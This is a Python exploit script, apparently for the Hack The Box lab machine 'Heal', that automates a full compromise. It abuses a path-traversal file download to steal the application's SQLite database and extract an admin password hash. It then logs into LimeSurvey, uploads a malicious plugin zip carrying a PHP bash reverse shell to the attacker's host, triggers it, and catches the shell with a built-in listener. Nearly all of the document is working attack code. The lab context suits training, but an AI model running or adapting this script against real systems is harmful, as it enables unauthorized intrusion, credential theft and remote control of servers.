import requests
import argparse
import sys, signal, re, time
from bs4 import BeautifulSoup
import zipfile
import os
import socket
import threading

listener_thread = None
listener_socket = None

def contr_c(sig, frame):
    print(f"\n[!] Exiting the program...")
    global listener_thread, listener_socket, reverse_shell_conn
    try:
        if reverse_shell_conn:
            reverse_shell_conn.close()
        if listener_socket:
            listener_socket.close()
        if listener_thread and listener_thread.is_alive():
            listener_thread.join(timeout=1)
    except Exception as e:
        print(f"[!] Cleanup error: {e}")
    finally:
        sys.exit(1)

signal.signal(signal.SIGINT, contr_c)


# Disable SSL warnings (only for HTB scenarios)
requests.packages.urllib3.disable_warnings()

# Base configuration
BASE_URL = "http://api.heal.htb"
LIMESURVEY_URL = "http://take-survey.heal.htb"
HEADERS = {
    "Content-Type": "application/json",
    "Origin": "http://heal.htb",
    "Referer": "http://heal.htb/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "application/json, text/plain, */*"
}

# Register user
def register_user(username, email, password):
    data = {
        "username": username,
        "fullname": username,
        "email": email,
        "password": password
    }
    r = requests.post(f"{BASE_URL}/signup", json=data, headers=HEADERS, verify=False)
    if r.status_code == 201:
        try:
            return r.json().get("token")
        except ValueError:
            return None
    return None

# Login and return token
def login_user(username, password):
    data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{BASE_URL}/signin", json=data, headers=HEADERS, verify=False)
    if r.status_code == 200:
        try:
            return r.json().get("token")
        except ValueError:
            return None
    return None


# Download vulnerable file (LFI)
def download_file(token, filename):
    headers = HEADERS.copy()
    headers["Authorization"] = f"Bearer {token}"
    r = requests.get(f"{BASE_URL}/download?filename={filename}", headers=headers, verify=False)
    if r.status_code == 200:
        return r.content
    return None

# Extract Ralph's hash from raw SQLite binary text content
def get_database(content):
    content_str = content.decode(errors='ignore')
    lines = content_str.splitlines()
    for line in lines:
        if "ralph@heal.htb" in line:
            parts = line.split("ralph@heal.htb")
            if len(parts) > 1:
                after = parts[1]
                # Cut until year 2024 to remove timestamp
                cutoff = after.find("2024")
                if cutoff != -1:
                    hash_candidate = after[:cutoff].strip().split('|')[0]
                    if hash_candidate.startswith("$2"):
                        print(f"[+] Ralph hash: {hash_candidate}")
                        print("[>] Crack this hash using hashcat or john with rockyou.txt")
                        print("[>] Once cracked, run this script again using: --type getRevShellSlime")
                        return
    print("[!] Ralph hash not found.")



# Generate malicious LimeSurvey plugin zip file
def generate_payload(ip, port):
    os.makedirs("pwned", exist_ok=True)
    with open("pwned/config.xml", "w") as f:
        f.write("""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<config>
    <metadata>
        <name>pwned</name>
        <type>plugin</type>
        <version>6.6.4</version>
        <author>pwned</author>
        <license>GNU General Public License version 3 or later</license>
        <description><![CDATA[Author : pwned]]></description>
    </metadata>
    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
    </compatibility>
</config>""")

    with open("pwned/revshell.php", "w") as f:
        f.write(f"<?php\nexec(\"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");\n?>")
    zipf = zipfile.ZipFile("pwned.zip", "w", zipfile.ZIP_DEFLATED)
    zipf.write("pwned/config.xml", arcname="config.xml")
    zipf.write("pwned/revshell.php", arcname="revshell.php")
    zipf.close()
    print("[+] Payload pwned.zip created successfully")


# Login to LimeSurvey
def limesurvey_login(username, password):
    session = requests.Session()
    login_page = session.get(f"{LIMESURVEY_URL}/index.php/admin/authentication/sa/login", verify=False)
    soup = BeautifulSoup(login_page.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'YII_CSRF_TOKEN'})['value']
    print(f"[*] Retrieved CSRF token: {csrf_token}")

    data = {
        "YII_CSRF_TOKEN": csrf_token,
        "authMethod": "Authdb",
        "user": username,
        "password": password,
        "loginlang": "default",
        "action": "login",
        "width": "1894",
        "login_submit": "login"
    }

    login_resp = session.post(f"{LIMESURVEY_URL}/index.php/admin/authentication/sa/login", data=data, verify=False)
    if "logout" in login_resp.text:
        print("[+] LimeSurvey login successful")
        return session
    else:
        print("[!] LimeSurvey login failed")
        sys.exit(1)


# Upload malicious plugin via LimeSurvey
def upload_plugin(session):
    # Check if plugin already exists
    revshell_url = f"{LIMESURVEY_URL}/upload/plugins/pwned/revshell.php"
    check = session.get(revshell_url, verify=False)
    if check.status_code == 200:
        print("[!] Plugin already deployed. Triggering reverse shell...")
        return True

    upload_page = session.get(f"{LIMESURVEY_URL}/index.php/admin/pluginmanager/sa/index", verify=False)
    soup = BeautifulSoup(upload_page.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'YII_CSRF_TOKEN'})['value']
    print(f"[*] Upload CSRF token: {csrf_token}")

    with open("pwned.zip", "rb") as file:
        files = {"the_file": file}
        data = {
            "YII_CSRF_TOKEN": csrf_token,
            "action": "templateupload"
        }
        r = session.post(f"{LIMESURVEY_URL}/index.php/admin/pluginmanager?sa=upload", files=files, data=data, verify=False )
        if r.status_code == 200:
            print("[+] Plugin uploaded successfully")
            time.sleep(2)
            soup = BeautifulSoup(r.text, 'html.parser')
            csrf_token = soup.find('input', {'name': 'YII_CSRF_TOKEN'})['value']
            print(f"[*] Confirm Install CSRF token: {csrf_token}")

            data = {
            "YII_CSRF_TOKEN": csrf_token,
            "isUpdate": "false"
            }
            time.sleep(4)
            r = session.post(f"{LIMESURVEY_URL}/index.php/admin/pluginmanager?sa=installUploadedPlugin",  data=data, verify=False)
            if r.status_code == 200:
                print("[+] Plugin installed and confirmed successfully")
                return True
            else:
                print("[!] Plugin installation confirmation failed")
                sys.exit(1)
                
        else:
            print("[!] Plugin upload failed")
            sys.exit(1)


def trigger_shell(session):
    shell_url = f"{LIMESURVEY_URL}/upload/plugins/pwned/revshell.php"
    print("[*] Triggering reverse shell...")
    r = session.get(shell_url, verify=False)
    if r.status_code == 200:
        print("[+] Reverse shell triggered. Check your listener!")
    else:
        print("[!] Failed to trigger reverse shell. Status code:", r.status_code)
        sys.exit(1)   


# Start TCP listener to receive reverse shell
def start_listener(host, port):
    def handler():
        global listener_socket, reverse_shell_conn
        port_int = int(port)
        print(f"[*] Listening for reverse shell on {host}:{port_int}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port_int))
            s.listen(1)
            conn, addr = s.accept()
            print(f"[+] Connection received from {addr[0]}:{addr[1]}")
            conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
            while True:
                try:
                    command = input("$ ")
                    if command.strip().lower() in ['exit', 'quit']:
                        conn.sendall(b"exit\n")
                        break
                    conn.sendall((command + "\n").encode())
                    time.sleep(0.5)
                    data = conn.recv(4096)
                    output = data.decode(errors='ignore').strip()
                    if output:
                        print(output)
                except KeyboardInterrupt:
                    print("\n[!] Closing listener...")
                    break
            conn.close()

    global listener_thread
    listener_thread = threading.Thread(target=handler)
    listener_thread.start()
   

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AutoPwn for Heal - HTB')
    parser.add_argument('--username', default='pwned', help='Username to register/login')
    parser.add_argument('--email', default='pwned@pwened.com', help='Email for registration Heal.htb API')
    parser.add_argument('--password', default='pwned', help='Password for login/registration Heal.htb API')
    parser.add_argument('--file', default='../../storage/development.sqlite3', help='File to download via LFI')
    parser.add_argument('--type', required=True, default='getCredentials', help='Execution phase type 1. getCredentials, 2. getRevShellSlime')
    parser.add_argument('--lhost',  help='Attacker IP for reverse shell')
    parser.add_argument('--lport',  help='Attacker port for reverse shell')
    parser.add_argument('--adminuser', default='ralph@heal.htb', help='LimeSurvey admin username')
    parser.add_argument('--adminpass', help='LimeSurvey admin password (after cracking)')
    args = parser.parse_args()
    
    print("[*] Execution phase: {}".format(args.type))

    if args.type == "getCredentials":
        print("[*] Trying login...")
        token = login_user(args.username, args.password)

        if not token:
            print("[!] Login failed. Trying registration...")
            token = register_user(args.username, args.email, args.password)
            if not token:
                token = login_user(args.username, args.password)
            else:
                print("[!] Registration failed. Exiting.")
                exit(1)

        if token:
            print(f"[*] Got token: {token}")
            print(f"[*] Attempting to download: {args.file}")
            content = download_file(token, args.file)
            if content:
                if "sqlite" in args.file:
                    get_database(content)
                else:
                    print(f"[+] File content:\n{content.decode(errors='ignore')}")
            else:
                print("[!] File download failed or not found.")
        else:
            print("[!] Could not retrieve JWT token.")

    elif args.type == "getRevShellSlime":
        if not args.lhost or not args.lport or not args.adminuser  or not args.adminpass:
            print("[!] Missing required parameters: --lhost and/or --lport and/or --adminuser and/or --adminpass")
            sys.exit(1)
        
        generate_payload(args.lhost, args.lport)
        session = limesurvey_login(args.adminuser, args.adminpass)
        if upload_plugin(session):
            start_listener(args.lhost, args.lport)
            trigger_shell(session)
        
